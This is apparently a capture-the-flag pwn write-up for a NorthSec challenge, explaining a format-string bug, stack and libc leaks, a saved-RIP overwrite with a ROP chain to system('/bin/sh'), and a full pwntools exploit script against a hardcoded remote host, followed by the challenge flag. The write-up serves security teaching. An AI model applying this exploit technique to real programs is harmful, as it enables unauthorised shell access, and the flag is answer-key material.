
# 🧙 Necro — Pwn Writeup

![CTF](https://img.shields.io/badge/CTF-NorthSec-blue)
![Category](https://img.shields.io/badge/Category-Pwn-red)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium--Hard-orange)
![Exploit](https://img.shields.io/badge/Technique-FormatString%20%2B%20ROP-green)

---

## 📜 Description

> *"Your words don't just echo — they reshape reality. Bend the ritual to your will."*

We are given a binary `chall` with a menu:
- Bind a Soul
- Inscribe Ritual
- Release Soul

The goal is to retrieve a flag in the format:

NSC{...}

---

## 🔍 Initial Analysis

```bash
checksec chall
````

```
RELRO:    Full RELRO
Canary:   Yes
NX:       Yes
PIE:      Yes
```

### ⚠️ Observations

* No classic buffer overflow (stack protected)
* GOT overwrite blocked (Full RELRO)
* PIE enabled → addresses randomized
* We must look for logic bugs

---

## 🧠 Vulnerability

Inside `ritual()`:

```c
read(0, buf, 0x200);
printf(buf);
```

🚨 **Format String Vulnerability**

User input is directly passed to `printf`, allowing:

* Memory leaks (`%p`, `%s`)
* Arbitrary writes (`%n`)

---

## 🎯 Exploitation Strategy

Instead of using heap tricks or hooks, we go for a reliable technique:

👉 **Overwrite the saved RIP on the stack using Format String → inject ROP chain → system("/bin/sh")**

---

## 🧩 Step 1 — Find Format String Offset

Test:

```
AAAABBBB%6$p
```

Output:

```
0x4242424241414141
```

✅ Offset = **6**

---

## 🧩 Step 2 — Leak Stack & libc

Payload:

```
%44$p|%47$p|%51$p|%53$p
```

Example output:

```
0x7ffeecb2ba50|0x7ffeecb2ba40|0x7ffeecb2ba44|0x7f71d08a1297
```

### Extracted info

* `%44$p`, `%47$p`, `%51$p` → stack addresses
* `%53$p` → libc leak (`write+23`)

---

## 🧩 Step 3 — Compute Addresses

### 📌 Saved RIP address

```
saved_rip_addr = leak47 - 0x8
```

### 📌 libc base

```
libc_base = leak53 - libc.sym['write'] - 23
```

---

## 🧩 Step 4 — Build ROP Chain

We build:

```
ret
pop rdi ; ret
"/bin/sh"
system
```

👉 `ret` is used for stack alignment (important on x64)

---

## 🧩 Step 5 — Overwrite saved RIP

Using format string write:

```
writes = {
    saved_rip_addr: ret,
    saved_rip_addr+8: pop_rdi,
    saved_rip_addr+16: binsh,
    saved_rip_addr+24: system
}
```

---

## 🧩 Step 6 — Trigger Execution

When `ritual()` returns:

👉 Execution jumps to our ROP chain
👉 Executes:

```
system("/bin/sh")
```

---

## 🏁 Exploit Code

```python
from pwn import *
import time

HOST = "34.123.57.171"
PORT = 44112

context.binary = elf = ELF("./chall", checksec=False)
libc = ELF("./libs/libc-2.31.so", checksec=False)
context.log_level = "info"

FMT_OFF = 6

def start():
    return remote(HOST, PORT)

def recv_menu(p):
    return p.recvuntil(b"4. Exit")

def choose_ritual(p):
    recv_menu(p)
    p.sendline(b"2")
    p.recvuntil(b"ritual:")

def ritual(p, payload):
    choose_ritual(p)
    p.sendline(payload)
    p.recvuntil(b"The ritual echoes...\n")
    return p.recvuntil(b"\n\n=== Dark Arts Menu ===", drop=True)

def main():
    p = start()

    # Leak stack + libc
    out = ritual(p, b"%44$p|%47$p|%51$p|%53$p")
    a44, a47, a51, l53 = [int(x,16) for x in out.decode().split("|")]

    saved_rip_addr = a47 - 0x8
    libc.address = l53 - libc.sym['write'] - 23

    log.success(f"libc base = {hex(libc.address)}")

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi','ret']).address
    ret = rop.find_gadget(['ret']).address
    binsh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym['system']

    payload = fmtstr_payload(FMT_OFF, {
        saved_rip_addr: ret,
        saved_rip_addr+8: pop_rdi,
        saved_rip_addr+16: binsh,
        saved_rip_addr+24: system
    }, write_size='short')

    choose_ritual(p)
    p.sendline(payload)

    time.sleep(0.3)

    p.sendline(b"cat flag.txt")
    print(p.recvrepeat(2).decode())

    p.interactive()

if __name__ == "__main__":
    main()
```

---

## 🏆 Flag

```
NSC{67428abdbd904497cb338d73dbf4f5a2}
```

---

## 🧠 Key Takeaways

* Format String → full read/write primitive
* Full RELRO does not protect stack
* Overwriting saved RIP via FSB is powerful
* ROP + libc is often simpler than heap exploitation

---

🔥 *"You didn’t just bend the ritual… you controlled it."*

```

---
```
